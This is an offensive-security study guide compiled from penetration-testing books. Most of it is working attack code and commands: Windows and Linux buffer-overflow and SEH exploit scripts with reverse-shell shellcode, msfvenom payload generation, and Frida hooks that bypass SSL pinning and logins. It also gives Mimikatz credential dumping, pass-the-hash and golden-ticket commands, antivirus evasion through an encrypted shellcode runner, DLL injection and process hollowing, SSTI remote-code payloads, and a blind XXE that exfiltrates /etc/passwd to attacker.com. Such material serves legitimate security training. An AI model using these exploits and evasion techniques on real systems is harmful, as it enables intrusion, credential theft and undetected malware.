# Advanced Cybersecurity Techniques - Part 2
## Exploit Development, Mobile Hacking & Advanced Techniques

*Compiled from: Penetration Testing (Georgia Weidman), Metasploit 2E, and professional security resources*

---

## Table of Contents
1. [Exploit Development Fundamentals](#exploit-development-fundamentals)
2. [Buffer Overflow Exploitation](#buffer-overflow-exploitation)
3. [Structured Exception Handler (SEH) Overwrites](#structured-exception-handler-overwrites)
4. [Mobile Device Penetration Testing](#mobile-device-penetration-testing)
5. [Advanced Password Attacks](#advanced-password-attacks)
6. [Antivirus Evasion Techniques](#antivirus-evasion-techniques)
7. [Advanced Web Application Attacks](#advanced-web-application-attacks)

---

## Exploit Development Fundamentals

### Understanding Memory Layout

#### Stack Structure
```
High Memory Address
├── Environment Variables
├── Command Line Arguments
├── Stack Frame N (Current)
│   ├── Local Variables
│   ├── Saved EBP (Base Pointer)
│   ├── Return Address
│   └── Function Arguments
├── Stack Frame N-1
└── Stack Frame N-2
Low Memory Address (ESP points here)
```

#### CPU Registers (x86)

**General Purpose Registers:**
- **EAX** - Accumulator (arithmetic operations, return values)
- **EBX** - Base register (base pointer for memory access)
- **ECX** - Counter (loop operations)
- **EDX** - Data register (I/O operations, multiplication/division)

**Index Registers:**
- **ESI** - Source Index (string/memory operations)
- **EDI** - Destination Index (string/memory operations)

**Pointer Registers:**
- **ESP** - Stack Pointer (points to top of stack)
- **EBP** - Base Pointer (points to base of stack frame)
- **EIP** - Instruction Pointer (points to next instruction to execute)

**Segment Registers:**
- **CS** - Code Segment
- **DS** - Data Segment
- **SS** - Stack Segment
- **ES, FS, GS** - Extra Segments

### Assembly Language Basics

#### Common x86 Instructions
```assembly
; Data Movement
MOV dest, src          ; Copy src to dest
PUSH value            ; Push value onto stack
POP dest              ; Pop value from stack into dest
LEA dest, src         ; Load effective address

; Arithmetic
ADD dest, src         ; dest = dest + src
SUB dest, src         ; dest = dest - src
INC dest              ; dest = dest + 1
DEC dest              ; dest = dest - 1
MUL src               ; EAX = EAX * src
DIV src               ; Divide EAX by src

; Logical
AND dest, src         ; Bitwise AND
OR dest, src          ; Bitwise OR
XOR dest, src         ; Bitwise XOR (often used to zero registers)
NOT dest              ; Bitwise NOT

; Control Flow
JMP addr              ; Unconditional jump
CALL addr             ; Call function
RET                   ; Return from function
CMP op1, op2          ; Compare operands (sets flags)
JE/JZ addr            ; Jump if equal/zero
JNE/JNZ addr          ; Jump if not equal/not zero
JG/JGE addr           ; Jump if greater/greater or equal
JL/JLE addr           ; Jump if less/less or equal

; Stack Frame Setup
PUSH EBP              ; Save old base pointer
MOV EBP, ESP          ; Set new base pointer
SUB ESP, 0x10         ; Allocate local variables
; ... function body ...
MOV ESP, EBP          ; Restore stack pointer
POP EBP               ; Restore old base pointer
RET                   ; Return
```

---

## Buffer Overflow Exploitation

### Linux Stack-Based Buffer Overflow

#### Vulnerable Program Example
```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable: no bounds checking
    printf("Input: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}

// Compile without protections:
// gcc -o vuln vuln.c -fno-stack-protector -z execstack -m32
```

#### Exploitation Process

**Step 1: Crash the Application**
```bash
# Generate pattern to find offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# Run with pattern
./vuln "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

# Check crash with gdb
gdb ./vuln
run "Aa0Aa1Aa2..."
# Note EIP value
```

**Step 2: Calculate Offset**
```bash
# Find offset to EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41326341
# Output: [*] Exact match at offset 76
```

**Step 3: Verify Control of EIP**
```python
#!/usr/bin/env python3
import struct

offset = 76
eip = struct.pack("<I", 0x42424242)  # "BBBB" in little-endian
payload = b"A" * offset + eip

print(payload)
```

```bash
./vuln $(python3 exploit.py)
# In gdb, EIP should be 0x42424242
```

**Step 4: Find JMP ESP**
```bash
# Using objdump
objdump -d vuln | grep "jmp.*esp"

# Or use msf-nasm_shell
msf-nasm_shell
nasm > jmp esp
# Output: 00000000  FFE4              jmp esp

# Search for FFE4 in binary
objdump -d vuln | grep "ff e4"
```

**Step 5: Generate Shellcode**
```bash
# Generate reverse shell shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f python

# Output will be in format:
buf =  b""
buf += b"\xda\xc1\xba\x9e\x6a\x17..."
```

**Step 6: Complete Exploit**
```python
#!/usr/bin/env python3
import struct

# Configuration
offset = 76
jmp_esp = 0x080484a3  # Address of JMP ESP instruction
nops = b"\x90" * 16   # NOP sled

# Shellcode (msfvenom generated)
shellcode =  b""
shellcode += b"\xda\xc1\xba\x9e\x6a\x17\x86\xd9\x74\x24\xf4\x5e\x29"
shellcode += b"\xc9\xb1\x12\x83\xee\xfc\x31\x56\x13\x03\x7a\xa9\x5d"
# ... (full shellcode)

# Build payload
payload = b"A" * offset
payload += struct.pack("<I", jmp_esp)
payload += nops
payload += shellcode

print(payload.decode('latin-1'))
```

### Windows Stack-Based Buffer Overflow

#### Key Differences from Linux
1. **DLL-based Architecture** - Find JMP ESP in system DLLs
2. **Bad Characters** - More restrictive (often `\x00\x0a\x0d\x20`)
3. **Memory Protections** - DEP, ASLR (discussed later)
4. **Calling Conventions** - STDCALL vs CDECL

#### Finding JMP ESP in Windows DLLs
```python
#!/usr/bin/env python3
# Using Immunity Debugger with mona.py

# In Immunity Debugger command line:
!mona modules

# Look for modules with:
# - No ASLR
# - No SafeSEH
# - No DEP
# - Executable permissions

# Find JMP ESP
!mona find -s "\xff\xe4" -m kernel32.dll

# Exclude bad characters
!mona find -s "\xff\xe4" -m kernel32.dll -cpb "\x00\x0a\x0d"
```

#### Windows Exploit Example
```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "192.168.1.100"
target_port = 9999

# Offset to EIP
offset = 2006

# JMP ESP address (from mona)
jmp_esp = 0x625011AF  # kernel32.dll

# NOP sled
nops = b"\x90" * 16

# Shellcode (windows/shell_reverse_tcp)
shellcode = (
    b"\xdb\xc0\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\xbe\x9b\x40"
    b"\xf0\x86\x31\x75\x17\x83\xc5\x04\x03\xdd\xb5\xb3\x79\x21"
    # ... (full shellcode)
)

# Build exploit
exploit = b"A" * offset
exploit += struct.pack("<I", jmp_esp)
exploit += nops
exploit += shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(exploit)
s.close()
```

### Finding Bad Characters

#### Bad Character Detection Script
```python
#!/usr/bin/env python3
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Generate all possible bytes
badchars = bytearray([
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
    # ... continue through 0xff
])

# Known bad characters (usually 0x00)
known_bad = [0x00]

# Remove known bad characters
for bad in known_bad:
    if bad in badchars:
        badchars.remove(bad)

offset = 2006
eip = b"B" * 4

payload = b"A" * offset + eip + bytes(badchars)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload)
s.close()

# In debugger, follow ESP in dump
# Check for missing/mangled characters
```

---

## Structured Exception Handler (SEH) Overwrites

### Understanding SEH

#### SEH Chain Structure
```
Exception Registration Record:
┌─────────────────────────┐
│  Next SEH Record (4B)   │  ← Pointer to next SEH in chain
├─────────────────────────┤
│  SEH Handler (4B)       │  ← Pointer to exception handler
└─────────────────────────┘
```

### SEH Overwrite Exploitation Process

**Step 1: Trigger Exception**
- Overflow buffer past SEH record
- Cause access violation
- SEH chain is processed

**Step 2: Control SEH Record**
```python
# Typical SEH overwrite structure
buffer = "A" * offset_to_seh
buffer += "B" * 4  # nSEH (Next SEH) - we'll use this
buffer += "C" * 4  # SEH Handler - overwrite with POP POP RET
buffer += "D" * remaining
```

**Step 3: Find POP POP RET**
```python
# Using mona in Immunity Debugger
!mona seh

# Find POP POP RET without SafeSEH
# Example output:
# 0x625011AF : pop edi # pop ebx # ret | {PAGE_EXECUTE_READ} [module.dll]
# SafeSEH: False, ASLR: False

# Exclude bad characters
!mona seh -cpb "\x00\x0a\x0d"
```

**Step 4: Short Jump**
The nSEH (Next SEH) field needs to contain a short jump to skip over the SEH handler:

```assembly
; Short jump forward 6 bytes
EB 06 90 90

; In bytes:
nSEH = "\xeb\x06\x90\x90"
```

**Step 5: Complete SEH Exploit**
```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "192.168.1.100"
target_port = 21

# Offsets
offset_to_nseh = 569
pop_pop_ret = 0x5F4580CA  # From mona seh

# Short jump (JMP 6 bytes forward)
nseh = b"\xeb\x06\x90\x90"

# POP POP RET address
seh = struct.pack("<I", pop_pop_ret)

# NOP sled
nops = b"\x90" * 16

# Shellcode
shellcode = (
    b"\xda\xd8\xbb\x9c\x32\xeb\x67\xd9\x74\x24\xf4\x5a\x2b\xc9"
    # ... (full shellcode)
)

# Build payload
payload = b"A" * offset_to_nseh
payload += nseh
payload += seh
payload += nops
payload += shellcode

# Send to FTP server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b'USER ' + payload + b'\r\n')
s.close()
```

### Bypassing SafeSEH

**Techniques:**
1. Use modules without SafeSEH protection
2. Use ROP (Return-Oriented Programming)
3. Target older systems without SafeSEH
4. Use executable memory pages from non-SafeSEH modules

```python
# Check module protections with mona
!mona modules

# Look for:
# SafeSEH: False
# ASLR: False
# DEP: False
```

---

## Mobile Device Penetration Testing

### Android Application Security

#### APK Analysis Workflow

**Step 1: Decompile APK**
```bash
# Install apktool
apt-get install apktool

# Decompile APK
apktool d application.apk -o output_dir

# Directory structure:
# output_dir/
# ├── AndroidManifest.xml
# ├── smali/              (Dalvik bytecode)
# ├── res/                (Resources)
# └── assets/

# Convert to Java (using jadx)
jadx application.apk -d java_output
```

**Step 2: Analyze AndroidManifest.xml**
```xml
<!-- Look for security issues -->

<!-- 1. Exported components without permissions -->
<activity android:name=".SecretActivity"
          android:exported="true"/>  <!-- Vulnerable! -->

<!-- 2. Debug mode enabled -->
<application android:debuggable="true">  <!-- Vulnerable! -->

<!-- 3. Backup allowed -->
<application android:allowBackup="true">  <!-- May expose data -->

<!-- 4. Network security -->
<application android:usesCleartextTraffic="true">  <!-- Insecure -->

<!-- 5. Dangerous permissions -->
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
```

**Step 3: Static Code Analysis**
```bash
# Search for hardcoded secrets
grep -r "password\|api_key\|secret\|token" output_dir/smali/

# Find SQL injection vulnerabilities
grep -r "rawQuery\|execSQL" output_dir/smali/

# Find insecure crypto
grep -r "DES\|MD5\|SHA1" output_dir/smali/

# Find insecure storage
grep -r "SharedPreferences\|SQLite" output_dir/smali/

# Using MobSF (Mobile Security Framework)
# Web-based analysis
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK for automated analysis
```

#### Dynamic Analysis with Frida

**Setup Frida**
```bash
# Install Frida on host
pip install frida-tools

# Push Frida server to Android device
adb root
adb push frida-server-16.0.0-android-arm64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server-16.0.0-android-arm64"
adb shell "/data/local/tmp/frida-server-16.0.0-android-arm64 &"

# List running apps
frida-ps -U
```

**Bypass SSL Pinning**
```javascript
// bypass_ssl.js
Java.perform(function() {
    // Hook OkHttp3
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(str, list) {
        console.log('[+] Bypassing SSL Pinning for: ' + str);
        return;
    };
    
    // Hook TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.sensepost.test.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    );
    
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[+] Bypassing SSL pinning');
        SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
    };
});

// Run: frida -U -f com.example.app -l bypass_ssl.js
```

**Hook Functions**
```javascript
// hook_login.js
Java.perform(function() {
    var LoginActivity = Java.use('com.example.app.LoginActivity');
    
    LoginActivity.checkPassword.implementation = function(password) {
        console.log('[+] Password entered: ' + password);
        
        // Always return true
        return true;
    };
    
    console.log('[*] Login bypass hooked');
});
```

**Dump Method Arguments**
```javascript
// dump_args.js
Java.perform(function() {
    var targetClass = Java.use('com.example.app.CryptoClass');
    
    targetClass.encrypt.overload('java.lang.String', 'java.lang.String').implementation = function(data, key) {
        console.log('[+] encrypt() called');
        console.log('[+] Data: ' + data);
        console.log('[+] Key: ' + key);
        
        // Call original method
        var result = this.encrypt(data, key);
        console.log('[+] Result: ' + result);
        
        return result;
    };
});
```

#### Android Attack Scenarios

**1. Insecure Data Storage**
```bash
# Access app's data directory
adb shell
cd /data/data/com.example.app/

# Check SharedPreferences
cat shared_prefs/*.xml

# Check databases
cd databases/
sqlite3 database.db
.tables
.dump

# Check for cached credentials
grep -r "password" .
```

**2. Exported Components Exploitation**
```bash
# List exported components
adb shell dumpsys package com.example.app | grep "android:exported"

# Launch exported activity
adb shell am start -n com.example.app/.SecretActivity

# Send intent to exported receiver
adb shell am broadcast -a com.example.app.SECRET_ACTION

# Access exported content provider
adb shell content query --uri content://com.example.app.provider/secrets
```

**3. Deep Link Exploitation**
```xml
<!-- Vulnerable deep link in AndroidManifest.xml -->
<intent-filter>
    <data android:scheme="myapp"
          android:host="reset"/>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
</intent-filter>
```

```bash
# Exploit via ADB
adb shell am start -W -a android.intent.action.VIEW -d "myapp://reset?user=admin&token=123"

# Exploit via malicious app
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("myapp://reset?user=admin&token=123"));
startActivity(intent);
```

### iOS Application Security

#### iOS App Analysis

**Setup**
```bash
# Jailbroken device required
# Install SSH
# Install Frida
# Install tools: Cycript, class-dump-z, Clutch

# SSH to device
ssh root@iphone_ip
# Default password: alpine
```

**Decrypt IPA**
```bash
# Using Clutch
clutch -i  # List installed apps
clutch -d com.example.app  # Decrypt app

# Using frida-ios-dump
python dump.py com.example.app
```

**Static Analysis**
```bash
# Extract IPA
unzip application.ipa

# Analyze binary
otool -L Payload/App.app/App
class-dump-z Payload/App.app/App > headers.txt

# Find strings
strings Payload/App.app/App | grep -i "password\|api\|secret"
```

**Runtime Analysis with Frida**
```javascript
// ios_hook.js
if (ObjC.available) {
    var LoginController = ObjC.classes.LoginViewController;
    
    // Hook Objective-C method
    Interceptor.attach(LoginController['- authenticateUser:password:'].implementation, {
        onEnter: function(args) {
            console.log('[+] authenticateUser called');
            console.log('[+] User: ' + ObjC.Object(args[2]).toString());
            console.log('[+] Pass: ' + ObjC.Object(args[3]).toString());
        },
        onLeave: function(retval) {
            console.log('[+] Return value: ' + retval);
            // Force return true
            retval.replace(1);
        }
    });
} else {
    console.log('Objective-C Runtime not available');
}
```

**Keychain Dumping**
```bash
# Using Keychain-Dumper
keychain_dumper > keychain.txt

# Manual keychain query
security find-generic-password -ga "AppName"
```

---

## Advanced Password Attacks

### Rainbow Tables

#### Understanding Rainbow Tables
- Precomputed hash tables
- Trade time for space
- Chain reduction functions
- Covers large keyspace efficiently

**Using RainbowCrack**
```bash
# Generate rainbow table
rtgen md5 loweralpha 1 7 0 3800 33554432 0

# Sort table
rtsort *.rt

# Crack hashes
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
```

### Pass-the-Hash Attacks

#### Windows NTLM Hash Extraction
```bash
# Using Metasploit
use post/windows/gather/hashdump
set SESSION 1
run

# Using Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Format:
# username:RID:LM_hash:NTLM_hash:::
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### Pass-the-Hash with Metasploit
```bash
use exploit/windows/smb/psexec
set RHOST 192.168.1.100
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit
```

#### Pass-the-Hash with CrackMapExec
```bash
# Single target
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Network range
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# Execute command
crackmapexec smb 192.168.1.100 -u Administrator -H hash -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.100 -u Administrator -H hash --sam
```

### Kerberos Attacks

#### AS-REP Roasting
```bash
# Using Impacket
GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip 10.10.10.10

# Crack with Hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

#### Kerberoasting
```bash
# Request service tickets
GetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.10 -request

# Crack with Hashcat
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# Using Rubeus (on Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
```

#### Golden Ticket Attack
```bash
# Requirements:
# - KRBTGT hash
# - Domain SID
# - Domain name

# Using Mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ptt

# Using Impacket
ticketer.py -nthash hash -domain-sid S-1-5-21-... -domain domain.com Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py domain.com/Administrator@target -k -no-pass
```

---

## Antivirus Evasion Techniques

### Understanding AV Detection

**Detection Methods:**
1. **Signature-based** - Pattern matching against known malware
2. **Heuristic** - Behavioral analysis
3. **Sandboxing** - Execute in isolated environment
4. **Machine Learning** - AI-based detection

### Payload Encoding

#### MSFvenom Encoders
```bash
# Single encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# List available encoders
msfvenom -l encoders
```

### Payload Encryption

#### Custom XOR Encoder
```python
#!/usr/bin/env python3

def xor_encrypt(data, key):
    """XOR encrypt/decrypt data with key"""
    encrypted = bytearray()
    key_len = len(key)
    
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % key_len])
    
    return bytes(encrypted)

# Original shellcode
shellcode = b"\xfc\x48\x83\xe4\xf0\xe8..."

# Encryption key
key = b"MySecretKey123"

# Encrypt
encrypted = xor_encrypt(shellcode, key)

# Generate C code
print("unsigned char encrypted[] = {")
for i in range(0, len(encrypted), 16):
    chunk = encrypted[i:i+16]
    hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
    print(f"    {hex_str},")
print("};")

# Decryption stub
print("\n// Decryption in C:")
print("unsigned char key[] = \"MySecretKey123\";")
print("for (int i = 0; i < sizeof(encrypted); i++) {")
print("    encrypted[i] ^= key[i % sizeof(key) - 1];")
print("}")
print("((void(*)())encrypted)();  // Execute")
```

### Process Injection

#### DLL Injection
```c
// injector.c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <DLL_PATH>\n", argv[0]);
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    char *dll_path = argv[2];
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process\n");
        return 1;
    }
    
    // Allocate memory in target process
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1,
                                       MEM_COMMIT, PAGE_READWRITE);
    
    // Write DLL path to target process
    WriteProcessMemory(hProcess, pRemoteBuf, dll_path, strlen(dll_path) + 1, NULL);
    
    // Get address of LoadLibraryA
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"),
                                                  "LoadLibraryA");
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                       pRemoteBuf, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    printf("[+] DLL injected successfully\n");
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

#### Process Hollowing
```c
// process_hollowing.c
#include <windows.h>

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    
    // Create process in suspended state
    CreateProcess("C:\\Windows\\System32\\notepad.exe",
                  NULL, NULL, NULL, FALSE,
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Get base address of target
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Unmap original executable
    ZwUnmapViewOfSection(pi.hProcess, (PVOID)ctx.Ebx + 8);
    
    // Allocate memory for our payload
    LPVOID pImageBase = VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    
    // Write payload
    WriteProcessMemory(pi.hProcess, pImageBase, payload, payload_size, NULL);
    
    // Update entry point
    ctx.Eax = (DWORD)pImageBase + entry_point_offset;
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    return 0;
}
```

### Obfuscation Techniques

#### String Obfuscation
```python
# Obfuscate strings to avoid signature detection
def obfuscate_string(s):
    """Base64 + XOR obfuscation"""
    import base64
    key = 0x42
    encoded = base64.b64encode(bytes([c ^ key for c in s.encode()])).decode()
    return encoded

def deobfuscate_string(s):
    """Reverse obfuscation"""
    import base64
    key = 0x42
    decoded = bytes([c ^ key for c in base64.b64decode(s)])
    return decoded.decode()

# Usage in exploit
api_call = deobfuscate_string("Gx4bHRsd")  # "VirtualAlloc"
```

---

## Advanced Web Application Attacks

### Server-Side Template Injection (SSTI)

#### Detection
```python
# Test payloads for various template engines
payloads = {
    "Jinja2": "{{7*7}}",  # Python
    "Twig": "{{7*7}}",    # PHP
    "Freemarker": "${7*7}",  # Java
    "Velocity": "#set($x=7*7)$x",  # Java
    "Smarty": "{7*7}",  # PHP
}

# Expected output: 49
```

#### Exploitation

**Jinja2 (Python)**
```python
# Remote Code Execution
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}

# Simplified RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Read file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

**Twig (PHP)**
```php
# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### XML External Entity (XXE) Injection

#### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

#### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root></root>
```

```xml
<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### NoSQL Injection

#### MongoDB Injection
```javascript
// Vulnerable query
db.users.find({username: req.body.username, password: req.body.password})

// Bypass authentication
// POST data: username[$ne]=admin&password[$ne]=admin
// Translates to: {username: {$ne: "admin"}, password: {$ne: "admin"}}

// Extract data
username[$regex]=^admin&password[$ne]=wrong

// Brute force password character by character
username=admin&password[$regex]=^a
username=admin&password[$regex]=^ad
username=admin&password[$regex]=^adm
```

### GraphQL Attacks

#### Introspection Query
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

#### Authorization Bypass
```graphql
# Vulnerable - no authorization check
query {
  user(id: "1") {
    name
    email
    ssn
  }
}

# Try accessing other users
query {
  user(id: "2") {
    name
    email
    ssn
  }
}
```

#### Batch Attacks
```graphql
# Send multiple queries
query {
  user1: user(id: "1") { name }
  user2: user(id: "2") { name }
  user3: user(id: "3") { name }
  # ... up to thousands
}
```

---

## Practical Exercise Examples

### Exercise 1: Simple Buffer Overflow
```c
// vuln.c - Compile and exploit
#include <stdio.h>
#include <string.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("win() address: %p\n", win);
    vulnerable(argv[1]);
    
    return 0;
}

// Compile: gcc -o vuln vuln.c -fno-stack-protector -z execstack -m32
// Exploit: ./vuln $(python -c 'print "A"*76 + "\x??\x??\x??\x??"')
```

### Exercise 2: Format String Vulnerability
```c
// format.c
#include <stdio.h>

int main(int argc, char **argv) {
    if (argc != 2) return 1;
    
    printf(argv[1]);  // Vulnerable!
    printf("\n");
    
    return 0;
}

// Compile: gcc -o format format.c -fno-stack-protector -m32

// Exploits:
// Read stack: ./format "%x.%x.%x.%x"
// Read arbitrary memory: ./format "%s" (with address on stack)
// Write arbitrary memory: ./format "%n"
```

---

## Resources and References

### Essential Tools
- **Metasploit Framework** - Exploitation framework
- **Burp Suite** - Web application testing
- **Immunity Debugger** - Windows debugging
- **GDB with PEDA/GEF** - Linux debugging
- **Frida** - Dynamic instrumentation
- **Ghidra/IDA Pro** - Reverse engineering
- **Wireshark** - Network analysis

### Learning Resources
- **Exploit Database** - https://www.exploit-db.com
- **Phrack Magazine** - http://phrack.org
- **Corelan Team** - Exploit development tutorials
- **FuzzySecurity** - Windows exploit tutorials
- **LiveOverflow** - YouTube channel
- **OWASP** - Web security resources

### Practice Platforms
- **HackTheBox** - Penetration testing labs
- **TryHackMe** - Guided learning
- **VulnHub** - Vulnerable VMs
- **OverTheWire** - Wargames
- **ROP Emporium** - ROP challenges

---

*This concludes Part 2 of the Advanced Cybersecurity Techniques guide. Continue building your skills through practice and staying current with the latest attack techniques and defenses.*


